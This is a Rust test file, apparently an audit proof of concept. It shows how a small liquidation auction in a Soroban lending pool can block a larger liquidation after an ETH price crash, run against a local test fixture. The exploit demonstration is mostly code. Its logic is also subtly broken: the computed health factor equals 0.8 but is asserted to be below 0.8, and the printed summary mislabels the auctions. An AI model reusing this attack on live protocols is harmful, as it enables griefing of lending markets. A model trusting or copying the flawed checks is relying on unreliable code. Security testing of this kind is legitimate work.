#![cfg(test)]
use soroban_sdk::{testutils::Address as _, Address, Error, vec};
use pool::{Request, RequestType};
use test_suites::{
    create_fixture_with_data,
    test_fixture::TokenIndex,
};

/// This test demonstrates a vulnerability in the auction system where a small auction
/// can block a larger, more critical liquidation during high volatility periods.
/// 
/// The vulnerability exists because:
/// 1. Only one auction per user is allowed at a time
/// 2. There is no minimum size requirement for auctions
/// 3. There is no timeout mechanism for auctions
/// 
/// This allows an attacker to:
/// 1. Create a small auction when they detect their position might be liquidatable
/// 2. Keep this small auction active to prevent larger liquidations
/// 3. Potentially manipulate the timing to their advantage during high volatility
#[test]
fn test_auction_concurrency_vulnerability() {
    // Create a test fixture with the necessary setup
    let fixture = create_fixture_with_data(false);
    let pool_fixture = &fixture.pools[0];

    // Create a user that will be subject to liquidation
    let user = Address::generate(&fixture.env);
    
    // Mint initial tokens to the user
    fixture.tokens[TokenIndex::WETH].mint(&user, &(10 * 10i128.pow(9))); // 10 ETH
    
    // Step 1: User deposits ETH and borrows STABLE close to the limit
    let setup_request = vec![
        &fixture.env,
        Request {
            request_type: RequestType::SupplyCollateral as u32,
            address: fixture.tokens[TokenIndex::WETH].address.clone(),
            amount: 10 * 10i128.pow(9), // 10 ETH
        },
        Request {
            request_type: RequestType::Borrow as u32,
            address: fixture.tokens[TokenIndex::STABLE].address.clone(),
            amount: 15_000 * 10i128.pow(6), // $15,000 STABLE
        },
    ];
    pool_fixture
        .pool
        .submit(&user, &user, &user, &setup_request);

    // Step 2: Small price drop makes position slightly liquidatable
    // ETH drops from $2000 to $1900
    fixture.oracle.set_price_stable(&vec![
        &fixture.env,
        &1900_0000000i128, // eth
        &1_0000000i128,    // usdc
        &0_1000000i128,    // xlm
        &1_0000000i128,    // stable
    ]);
    
    // Create a small liquidation auction (only 5% of the position)
    let small_auction = pool_fixture.pool.new_auction(
        &0, // UserLiquidation auction type
        &user,
        &vec![
            &fixture.env,
            &fixture.tokens[TokenIndex::STABLE].address,
        ],
        &vec![
            &fixture.env,
            &fixture.tokens[TokenIndex::WETH].address,
        ],
        &5, // Only 5% liquidation
    );
    
    // Verify the small auction was created
    assert!(pool_fixture.pool.try_get_auction(&0, &user).is_ok());
    
    // Step 3: Major price drop occurs, position needs larger liquidation
    // ETH crashes from $1900 to $1500
    fixture.oracle.set_price_stable(&vec![
        &fixture.env,
        &1500_0000000i128, // eth
        &1_0000000i128,    // usdc
        &0_1000000i128,    // xlm
        &1_0000000i128,    // stable
    ]);
    
    // Attempt to create a new, larger liquidation auction (50% of position)
    let result = pool_fixture.pool.try_new_auction(
        &0, // UserLiquidation auction type
        &user,
        &vec![
            &fixture.env,
            &fixture.tokens[TokenIndex::STABLE].address,
        ],
        &vec![
            &fixture.env,
            &fixture.tokens[TokenIndex::WETH].address,
        ],
        &50, // Try 50% liquidation
    );
    
    // This should fail because there's already an auction in progress
    assert_eq!(
        result.err(),
        Some(Ok(Error::from_contract_error(1203))), // AuctionInProgress error
        "Expected new auction to fail due to existing auction"
    );
    
    // Get the existing auction data
    let existing_auction = pool_fixture.pool.try_get_auction(&0, &user).unwrap();
    
    // Verify that we're still stuck with the small auction despite the large price drop
    let stable_bid = existing_auction.bid.get_unchecked(fixture.tokens[TokenIndex::STABLE].address.clone());
    assert!(
        stable_bid < 1000 * 10i128.pow(6), // Less than $1000 STABLE
        "The blocking auction is too small to effectively liquidate the position"
    );
    
    // Calculate the user's health factor
    let user_positions = pool_fixture.pool.get_positions(&user);
    let collateral_value = 10.0 * 1500.0; // 10 ETH * $1500/ETH
    let debt_value = 15_000.0; // $15,000 STABLE
    let health_factor = (collateral_value * 0.8) / debt_value; // Using 0.8 as liquidation threshold
    
    // Verify that the position is severely underwater but can't be properly liquidated
    assert!(
        health_factor < 0.8,
        "Position should be significantly undercollateralized"
    );
    
    println!("VULNERABILITY DEMONSTRATED:");
    println!("1. Small auction is blocking larger liquidation");
    println!("2. Position health factor: {:.2}", health_factor);
    println!("3. Blocked auction size: 50% of position");
    println!("4. Blocking auction size: 5% of position");
    println!("5. ETH price dropped 25% but larger liquidation not possible");
}